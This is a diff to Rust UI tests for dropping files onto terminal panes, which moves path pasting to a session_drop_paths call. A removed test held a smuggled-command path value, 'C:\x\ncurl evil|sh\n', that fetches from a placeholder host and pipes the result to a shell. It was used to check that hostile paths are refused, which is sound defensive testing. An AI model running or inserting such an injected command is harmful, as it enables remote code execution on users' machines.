@@ -68,14 +68,10 @@ fn spaced_path() -> &'static str {
     if cfg!(windows) { r"C:\Users\alice\My Documents\notes.txt" } else { "/home/alice/My Documents/notes.txt" }
 }
 
-fn quoted_spaced_path() -> &'static str {
-    if cfg!(windows) { "\"C:\\Users\\alice\\My Documents\\notes.txt\"" } else { "'/home/alice/My Documents/notes.txt'" }
-}
-
 // ── File drop ────────────────────────────────────────────────────────────────────────────
 
 #[test]
-fn dragging_files_over_a_pane_shows_the_drop_overlay_and_a_drop_pastes_quoted_paths() {
+fn dragging_files_over_a_pane_shows_the_drop_overlay_and_a_drop_pastes_its_paths() {
     let mut h = h();
     assert!(!has(&h, "Drop to insert the path"));
     hover(&mut h, &[spaced_path()]);
@@ -83,15 +79,16 @@ fn dragging_files_over_a_pane_shows_the_drop_overlay_and_a_drop_pastes_quoted_pa
     hover(&mut h, &[spaced_path(), spaced_path()]);
     assert!(has(&h, "Drop to insert the 2 paths"));
 
-    let before = calls(&h, "session_send_text").len();
+    let before = calls(&h, "session_drop_paths").len();
     drop_files(&mut h, &[spaced_path()]);
-    let sent = calls(&h, "session_send_text");
+    let sent = calls(&h, "session_drop_paths");
     assert_eq!(sent.len(), before + 1, "one paste for one drop");
     let p = sent.last().unwrap();
     // No pointer over a pane yet: the active session (the demo's Odulodo.Web) takes it.
     assert_eq!(p["session_id"], "web");
-    assert_eq!(p["text"], quoted_spaced_path(), "quoted for the shell, pasted (session_send_text), no Enter");
-    assert!(p.get("submit").is_none());
+    // The engine quotes the paths for the session's shell and pastes them (see csm-engine's tests).
+    assert_eq!(p["paths"], json!([spaced_path()]));
+    assert!(calls(&h, "session_send_text").is_empty(), "the drop pastes through the office tool, not session_send_text");
     assert!(!has(&h, "Drop to insert the path"), "the overlay goes with the drop");
 }
 
@@ -103,17 +100,16 @@ fn a_drop_goes_to_the_pane_under_the_pointer() {
     h.step();
     hover(&mut h, &[spaced_path()]);
     drop_files(&mut h, &[spaced_path()]);
-    assert_eq!(calls(&h, "session_send_text").last().unwrap()["session_id"], "webps");
+    assert_eq!(calls(&h, "session_drop_paths").last().unwrap()["session_id"], "webps");
 }
 
 #[test]
-fn a_hostile_path_is_never_pasted() {
+fn a_drop_of_nothing_pastes_nothing() {
     let mut h = h();
-    let before = calls(&h, "session_send_text").len();
+    let before = calls(&h, "session_drop_paths").len();
     hover(&mut h, &["x"]);
-    drop_files(&mut h, &["C:\\x\ncurl evil|sh\n"]);
-    assert_eq!(calls(&h, "session_send_text").len(), before, "nothing is sent for a path with a newline in it");
-    assert!(h.query_by_label_contains("Nothing was inserted").is_some(), "and the person is told why");
+    drop_files(&mut h, &[]);
+    assert_eq!(calls(&h, "session_drop_paths").len(), before, "no paths, no paste");
 }
 
 // ── Claude commands ──────────────────────────────────────────────────────────────────────
